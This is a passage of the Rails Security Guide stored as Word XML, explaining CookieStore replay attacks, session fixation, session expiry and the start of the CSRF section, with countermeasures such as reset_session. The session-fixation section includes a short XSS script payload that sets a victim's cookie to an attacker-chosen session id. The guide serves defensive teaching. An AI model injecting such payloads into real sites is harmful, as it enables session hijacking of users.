              <w:t>config.action_dispatch.session = {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A79DC3B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '_app_session',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20027CFB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :secret</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '0x0dkfj3927dkc7djdh36rkckdfzsg...'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A816FD8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5C4FF693" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are, however, derivatives of CookieStore which encrypt the session hash, so the client cannot see it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B346E3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.6 Replay Attacks for CookieStore Sessions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B33201" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Another sort of attack you have to be aware of when using CookieStore is the replay attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F922B68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>It works like this:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4597F37F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="332"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we’ll do this for demonstration purposes).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71652A3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="332"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The user buys something.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5112AE4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="332"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>His new, lower credit will be stored in the session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B55361" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="332"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The dark side of the user forces him to take the cookie from the first step (which he copied) and replace the current cookie in the browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4C8BCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="332"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The user has his credit back.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529C0FF6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers (mongrels). Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481D3E10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The best </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>solution against it is not to store this kind of data in a session, but in the database_. In this case store the credit in the database and the logged_in_user</w:t>
      </w:r>
      <w:r>
        <w:t>id in the session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E2C2A8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.7 Session Fixation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A526E84" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Apart from stealing a user’s session id, the attacker may fix a session id known to him. This is called session fixation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37667C5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6DEBD64C" wp14:editId="0B891F1E">
            <wp:extent cx="4943475" cy="4057650"/>
            <wp:effectExtent l="19050" t="0" r="9525" b="0"/>
            <wp:docPr id="24" name="图片 20" descr="Session fix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ssion fixation"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId696" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4943475" cy="4057650"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BE07C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This attack focuses on fixing a user’s session id known to the attacker, and forcing the user’s browser into using this id. It is therefore not necessary for the attacker to steal the session id afterwards. Here is how this attack works:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223C3648" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="333"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The attacker creates a valid session id: He loads the login page of the web application where he wants to fix the session, and takes the session id in the cookie from the response (see number 1 and 2 in the image).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFB206D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="333"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>He possibly maintains the session. Expiring sessions, for example every 20 minutes, greatly reduces the time-frame for attack. Therefore he accesses the web application from time to time in order to keep the session alive.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F17DF40" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="333"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now the attacker will force the user’s browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accomplishes this attack. Here is an example: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>document.cookie="_session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_id=16d5b78abb28e3d6206b60f22a03c8d9";</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Read more about </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and injection later on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DC5239" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="333"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim’s browser will change the session id to the trap session id.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4B227C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="333"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>As the new trap session is unused, the web application will require the user to authenticate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0976B75B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="333"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn’t notice the attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A64DC67" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.8 Session Fixation – Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6813B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>One line of code will protect you from session fixation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C83097" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most effective countermeasure is to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>issue a new session identifier</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5BB13ACA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BFCC8D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="333534426"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>reset_session</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="39294634" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you use the popular RestfulAuthentication plugin for user management, add reset_session to the SessionsController#create action. Note that this removes any value from the session, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>you have to transfer them to the new session</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F77052A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another countermeasure is to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>save user-specific properties in the session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>These might change over the course of a session</w:t>
      </w:r>
      <w:r>
        <w:t>, so these users will not be able to use your application, or only in a limited way.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140E1904" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.9 Session Expiry</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE2728F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Sessions that never expire extend the time-frame for attacks such as cross-site reference forgery (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>), session hijacking and session fixation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3951DC6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>expire sessions in a database table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Session.sweep("20 minutes")</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to expire sessions that were used longer than 20 minutes ago.</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08916998" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1481FA79" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Session &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5972A243" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.sweep(time = 1.hour)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DC7C7EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>time.is_a?(String)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="144D6B93" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      time = time.split.inject { |count, unit| count.to_i.send(unit) }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79249AC6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C529CDD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5858725F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    delete_all "updated_at &lt; '#{time.ago.to_s(:db)}'"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5428872B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31D6629A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D8C8FCF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a created_at column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6048"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7332FF16" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2475DCC1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>delete_all "updated_at &lt; '#{time.ago.to_s(:db)}'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>OR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58A2A8CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  created_at &lt; '#{2.days.ago.to_s(:db)}'"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0670F2CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 Cross-Site Request Forgery (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361F1CB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629CFFC1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="267B7EF8" wp14:editId="6AC2A4FE">
            <wp:extent cx="4619625" cy="4410075"/>
            <wp:effectExtent l="19050" t="0" r="9525" b="0"/>
            <wp:docPr id="23" name="图片 21" descr="http://guides.ruby-china.org/images/c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uides.ruby-china.org/images/csrf.png"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId697" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4619625" cy="4410075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
